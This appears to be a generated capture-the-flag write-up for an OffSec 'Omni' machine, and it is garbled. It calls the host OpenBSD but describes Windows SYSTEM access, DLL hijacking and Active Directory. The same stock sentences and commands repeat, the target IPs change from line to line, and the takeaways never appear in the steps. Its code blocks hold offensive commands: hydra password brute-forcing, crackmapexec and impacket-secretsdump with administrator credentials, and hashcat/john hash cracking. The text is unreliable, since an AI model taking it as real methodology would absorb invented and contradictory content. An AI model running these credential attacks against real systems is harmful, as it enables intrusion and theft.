---
TitleSEO: "OffSec Proving Grounds — Omni (Medium OpenBSD) | ZureFX"
TitlePost: "OffSec Proving Grounds — Omni (Medium OpenBSD)"
Author: "ZureFX"
Description: "Full writeup for OffSec Proving Grounds Omni. DLL Hijacking and Subdomain Takeover to achieve medium compromise on OpenBSD."
Keywords: "reversing, tryhackme, web, pwntilldawn, hard, insane"
URL: "https://zurefx.github.io/writeups/htb-omni-378.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-omni-378/"
Date: "2024-03-20"
Tags: "Reversing, TryHackMe, Web, PwnTillDawn, Hard, Insane"
Section: "writeups"
Lang: "en"
main_img: "htb-omni-378"
Permalink: "/writeups/htb-omni-378.html"
BtnLabel: "Read Writeup"
Pick: 1
---
## Machine Info

### Overview

The target **Omni** is rated **Medium** on OffSec Proving Grounds. It runs **OpenBSD** and the IP address during this analysis was `10.15.139.217`.

### Objectives

Token impersonation allowed elevation to SYSTEM privileges on the target. Network traffic analysis revealed unencrypted communications containing user credentials.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
feroxbuster -h
crackmapexec smb 10.118.16.115 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.22.114.225 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Authentication bypass was achieved through careful manipulation of the login mechanism. The service account had excessive permissions assigned in Active Directory.

### Service Enumeration

The application stored sensitive credentials in an unencrypted configuration file. The kernel version was outdated and vulnerable to a publicly known exploit. The backup files contained sensitive information that should not have been accessible.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.13.233.141
feroxbuster -h
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
feroxbuster -h
```

The service was running without proper input validation, leading to injection vulnerabilities. Token impersonation allowed elevation to SYSTEM privileges on the target.

### Web Enumeration

The database credentials were hardcoded in the application source code. Lateral movement was facilitated by reusing discovered credentials across services.

```bash
crackmapexec smb 10.128.162.161 -u administrator -p 'P@ssw0rd!' --shares
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.15.151.121
```

Network traffic analysis revealed unencrypted communications containing user credentials. The service account had excessive permissions assigned in Active Directory. The backup files contained sensitive information that should not have been accessible.

## Exploitation

### Vulnerability Identification

The service account had excessive permissions assigned in Active Directory. Token impersonation allowed elevation to SYSTEM privileges on the target. Weak file permissions allowed modification of critical system files.

Key finding: **DLL Hijacking**.

Lateral movement was facilitated by reusing discovered credentials across services. Authentication bypass was achieved through careful manipulation of the login mechanism.

### Initial Access

The service account had excessive permissions assigned in Active Directory. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
nmap -sCV -p3306,636,110 10.90.18.67 -oN scan.txt
crackmapexec smb 10.84.40.121 -u administrator -p 'P@ssw0rd!' --shares
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.18.139.244/FUZZ
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Authentication bypass was achieved through careful manipulation of the login mechanism. Command injection was possible through unsanitized user input in the search functionality. Authentication bypass was achieved through careful manipulation of the login mechanism.

## Privilege Escalation

### Enumeration

Network traffic analysis revealed unencrypted communications containing user credentials. The backup files contained sensitive information that should not have been accessible. The web application was vulnerable to Server-Side Template Injection (SSTI).

```powershell
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.66.13.13 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
crackmapexec smb 10.30.210.196 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.108.86.68 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

### Exploitation

Unconstrained delegation was enabled on the compromised machine. Unconstrained delegation was enabled on the compromised machine.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.53.116.167
```

The kernel version was outdated and vulnerable to a publicly known exploit. Weak file permissions allowed modification of critical system files.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Privilege escalation was possible due to misconfigured sudo permissions. Authentication bypass was achieved through careful manipulation of the login mechanism.

## Summary

### Tools Used

- `enum4linux`
- `ffuf`
- `rpcclient`
- `smbclient`
- `nmap`
- `GetNPUsers`
- `msfvenom`
- `john`

### Key Takeaways

- DLL Hijacking
- Subdomain Takeover
- Unconstrained Delegation
- Broken Access Control
